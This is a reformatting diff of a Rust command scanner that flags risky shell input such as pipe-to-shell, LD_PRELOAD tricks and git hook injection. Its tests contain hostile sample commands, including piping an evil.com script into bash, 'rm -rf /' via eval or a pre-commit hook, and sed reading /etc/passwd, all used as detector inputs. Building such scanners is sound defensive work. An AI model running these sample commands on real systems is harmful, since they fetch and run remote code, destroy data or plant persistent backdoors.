@@ -107,12 +107,16 @@ pub fn scan_command(command: &str) -> SecurityScanResult {
     detect_shell_builtin_abuse(command, &mut threats);
 
     // Calculate risk score
-    let risk_score: u32 = threats.iter().map(|t| match t.severity {
-        Severity::Low => 5,
-        Severity::Medium => 15,
-        Severity::High => 35,
-        Severity::Critical => 60,
-    }).sum::<u32>().min(100);
+    let risk_score: u32 = threats
+        .iter()
+        .map(|t| match t.severity {
+            Severity::Low => 5,
+            Severity::Medium => 15,
+            Severity::High => 35,
+            Severity::Critical => 60,
+        })
+        .sum::<u32>()
+        .min(100);
 
     // Determine action
     let action = if threats.iter().any(|t| t.severity == Severity::Critical) {
@@ -224,8 +228,12 @@ fn detect_quote_desync(cmd: &str, threats: &mut Vec<SecurityThreat>) {
     let mut double_count = 0u32;
     let mut prev = ' ';
     for ch in cmd.chars() {
-        if ch == '\'' && prev != '\\' { single_count += 1; }
-        if ch == '"' && prev != '\\' { double_count += 1; }
+        if ch == '\'' && prev != '\\' {
+            single_count += 1;
+        }
+        if ch == '"' && prev != '\\' {
+            double_count += 1;
+        }
         prev = ch;
     }
     if single_count % 2 != 0 || double_count % 2 != 0 {
@@ -260,8 +268,7 @@ fn detect_glob_expansion(cmd: &str, threats: &mut Vec<SecurityThreat>) {
 fn detect_pipe_injection(cmd: &str, threats: &mut Vec<SecurityThreat>) {
     // Piping to dangerous commands
     let dangerous_pipes = [
-        "| sh", "| bash", "| zsh", "| eval", "| exec",
-        "| python", "| perl", "| ruby", "| node",
+        "| sh", "| bash", "| zsh", "| eval", "| exec", "| python", "| perl", "| ruby", "| node",
         "|sh", "|bash", "|zsh", "|eval",
     ];
     let lower = cmd.to_ascii_lowercase();
@@ -279,9 +286,16 @@ fn detect_pipe_injection(cmd: &str, threats: &mut Vec<SecurityThreat>) {
 
 fn detect_environment_manipulation(cmd: &str, threats: &mut Vec<SecurityThreat>) {
     let dangerous_vars = [
-        "LD_PRELOAD=", "LD_LIBRARY_PATH=", "DYLD_INSERT_LIBRARIES=",
-        "DYLD_LIBRARY_PATH=", "PATH=", "SHELL=", "HOME=",
-        "PYTHONPATH=", "NODE_PATH=", "RUBYLIB=",
+        "LD_PRELOAD=",
+        "LD_LIBRARY_PATH=",
+        "DYLD_INSERT_LIBRARIES=",
+        "DYLD_LIBRARY_PATH=",
+        "PATH=",
+        "SHELL=",
+        "HOME=",
+        "PYTHONPATH=",
+        "NODE_PATH=",
+        "RUBYLIB=",
     ];
     for var in &dangerous_vars {
         if cmd.contains(var) {
@@ -429,7 +443,10 @@ fn detect_git_injection(cmd: &str, threats: &mut Vec<SecurityThreat>) {
     let lower = cmd.to_ascii_lowercase();
     // Git commands that can execute arbitrary code
     let patterns = [
-        ("git filter-branch", "Git history rewrite with code execution"),
+        (
+            "git filter-branch",
+            "Git history rewrite with code execution",
+        ),
         ("git config.*alias", "Git alias injection"),
         ("git config.*core.hooksPath", "Git hooks path manipulation"),
         ("git config.*core.sshCommand", "Git SSH command injection"),
@@ -471,7 +488,10 @@ fn detect_sed_injection(cmd: &str, threats: &mut Vec<SecurityThreat>) {
 
 fn detect_history_manipulation(cmd: &str, threats: &mut Vec<SecurityThreat>) {
     let lower = cmd.to_ascii_lowercase();
-    if lower.contains("history -c") || lower.contains("history -w") || lower.contains("unset histfile") {
+    if lower.contains("history -c")
+        || lower.contains("history -w")
+        || lower.contains("unset histfile")
+    {
         threats.push(SecurityThreat {
             category: ThreatCategory::HistoryManipulation,
             description: "Shell history manipulation detected".into(),
@@ -483,7 +503,9 @@ fn detect_history_manipulation(cmd: &str, threats: &mut Vec<SecurityThreat>) {
 
 fn detect_signal_manipulation(cmd: &str, threats: &mut Vec<SecurityThreat>) {
     let lower = cmd.to_ascii_lowercase();
-    if lower.contains("trap ") && (lower.contains("exit") || lower.contains("err") || lower.contains("int")) {
+    if lower.contains("trap ")
+        && (lower.contains("exit") || lower.contains("err") || lower.contains("int"))
+    {
         threats.push(SecurityThreat {
             category: ThreatCategory::SignalManipulation,
             description: "Signal trap manipulation detected".into(),
@@ -524,7 +546,9 @@ fn detect_resource_exhaustion(cmd: &str, threats: &mut Vec<SecurityThreat>) {
 
 fn detect_symlink_attacks(cmd: &str, threats: &mut Vec<SecurityThreat>) {
     let lower = cmd.to_ascii_lowercase();
-    if lower.contains("ln -s") && (lower.contains("/etc/") || lower.contains("/usr/") || lower.contains("/var/")) {
+    if lower.contains("ln -s")
+        && (lower.contains("/etc/") || lower.contains("/usr/") || lower.contains("/var/"))
+    {
         threats.push(SecurityThreat {
             category: ThreatCategory::SymlinkAttack,
             description: "Symlink to system directory detected".into(),
@@ -578,7 +602,10 @@ fn detect_shell_builtin_abuse(cmd: &str, threats: &mut Vec<SecurityThreat>) {
             threats.push(SecurityThreat {
                 category: ThreatCategory::ShellBuiltinAbuse,
                 description: desc.to_string(),
-                severity: if pat.contains("eval") || pat.contains("exec") || pat.contains("zmodload") {
+                severity: if pat.contains("eval")
+                    || pat.contains("exec")
+                    || pat.contains("zmodload")
+                {
                     Severity::Critical
                 } else {
                     Severity::High
@@ -638,7 +665,9 @@ pub fn validate_command_paths(
         }
 
         // Check for escaping working directory
-        if path_str.starts_with('/') && !path_str.starts_with(&working_dir.to_string_lossy().as_ref()) {
+        if path_str.starts_with('/')
+            && !path_str.starts_with(&working_dir.to_string_lossy().as_ref())
+        {
             // Accessing absolute path outside working dir — not blocked but noted
         }
     }
@@ -667,21 +696,36 @@ mod tests {
     fn command_substitution_blocked() {
         let result = scan_command("echo $(whoami)");
         assert!(!result.safe);
-        assert!(result.threats.iter().any(|t| t.category == ThreatCategory::CommandSubstitution));
+        assert!(
+            result
+                .threats
+                .iter()
+                .any(|t| t.category == ThreatCategory::CommandSubstitution)
+        );
     }
 
     #[test]
     fn process_substitution_blocked() {
         let result = scan_command("diff <(ls dir1) <(ls dir2)");
         assert!(!result.safe);
-        assert!(result.threats.iter().any(|t| t.category == ThreatCategory::ProcessSubstitution));
+        assert!(
+            result
+                .threats
+                .iter()
+                .any(|t| t.category == ThreatCategory::ProcessSubstitution)
+        );
     }
 
     #[test]
     fn ifs_poisoning_blocked() {
         let result = scan_command("IFS=/ echo test");
         assert!(!result.safe);
-        assert!(result.threats.iter().any(|t| t.category == ThreatCategory::IFSPoisoning));
+        assert!(
+            result
+                .threats
+                .iter()
+                .any(|t| t.category == ThreatCategory::IFSPoisoning)
+        );
     }
 
     #[test]
@@ -695,28 +739,48 @@ mod tests {
     fn pipe_to_shell_blocked() {
         let result = scan_command("curl http://evil.com/script | bash");
         assert!(!result.safe);
-        assert!(result.threats.iter().any(|t| t.category == ThreatCategory::PipeInjection));
+        assert!(
+            result
+                .threats
+                .iter()
+                .any(|t| t.category == ThreatCategory::PipeInjection)
+        );
     }
 
     #[test]
     fn ld_preload_blocked() {
         let result = scan_command("LD_PRELOAD=/tmp/evil.so ls");
         assert!(!result.safe);
-        assert!(result.threats.iter().any(|t| t.category == ThreatCategory::EnvironmentManipulation));
+        assert!(
+            result
+                .threats
+                .iter()
+                .any(|t| t.category == ThreatCategory::EnvironmentManipulation)
+        );
     }
 
     #[test]
     fn eval_blocked() {
         let result = scan_command("eval 'rm -rf /'");
         assert!(!result.safe);
-        assert!(result.threats.iter().any(|t| t.category == ThreatCategory::ShellBuiltinAbuse));
+        assert!(
+            result
+                .threats
+                .iter()
+                .any(|t| t.category == ThreatCategory::ShellBuiltinAbuse)
+        );
     }
 
     #[test]
     fn zmodload_blocked() {
         let result = scan_command("zmodload zsh/net/tcp");
         assert!(!result.safe);
-        assert!(result.threats.iter().any(|t| t.category == ThreatCategory::ShellBuiltinAbuse));
+        assert!(
+            result
+                .threats
+                .iter()
+                .any(|t| t.category == ThreatCategory::ShellBuiltinAbuse)
+        );
     }
 
     #[test]
@@ -724,7 +788,12 @@ mod tests {
         // Zero-width space
         let cmd = format!("ls\u{200B}-la");
         let result = scan_command(&cmd);
-        assert!(result.threats.iter().any(|t| t.category == ThreatCategory::UnicodeAttack));
+        assert!(
+            result
+                .threats
+                .iter()
+                .any(|t| t.category == ThreatCategory::UnicodeAttack)
+        );
     }
 
     #[test]
@@ -738,13 +807,23 @@ mod tests {
     fn git_hooks_injection() {
         let result = scan_command("echo 'rm -rf /' > .git/hooks/pre-commit");
         assert!(!result.safe);
-        assert!(result.threats.iter().any(|t| t.category == ThreatCategory::GitInjection));
+        assert!(
+            result
+                .threats
+                .iter()
+                .any(|t| t.category == ThreatCategory::GitInjection)
+        );
     }
 
     #[test]
     fn sed_execute_blocked() {
         let result = scan_command("sed '1e id' /etc/passwd");
         assert!(!result.safe);
-        assert!(result.threats.iter().any(|t| t.category == ThreatCategory::SedInjection));
+        assert!(
+            result
+                .threats
+                .iter()
+                .any(|t| t.category == ThreatCategory::SedInjection)
+        );
     }
 }
